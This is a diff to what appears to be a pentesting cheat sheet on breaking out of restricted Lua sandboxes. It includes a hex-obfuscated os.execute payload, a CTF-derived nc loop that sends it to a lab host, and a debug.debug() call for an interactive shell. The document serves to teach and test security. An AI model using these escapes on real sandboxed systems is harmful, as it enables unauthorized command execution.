@@ -123,7 +123,7 @@ In this page you can find the global functions you have access to inside lua: [h
 **Eval** with command execution**:**
 
 ```bash
-loadstring(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
+load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
 
 Some tricks to **call functions of a library without using dots**:
@@ -150,6 +150,12 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #This attack from a CTF can be used to try to chain the function execute from "os" library
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
+```
+
+**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell \(and hopefully unlimited\) calling:
+
+```bash
+debug.debug()
 ```
 
 
